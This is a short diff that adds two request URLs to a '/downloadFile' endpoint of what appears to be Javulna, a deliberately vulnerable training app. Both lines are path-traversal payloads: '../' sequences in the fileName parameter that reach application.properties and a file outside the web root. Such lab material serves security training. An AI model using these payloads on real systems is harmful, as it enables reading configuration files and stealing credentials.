@@ -1,0 +1,2 @@
+{{javulna_host}}/downloadFile?fileName=../../src/main/resources/application.properties
+{{javulna_host}}/downloadFile?fileName=../../../../cw.ods
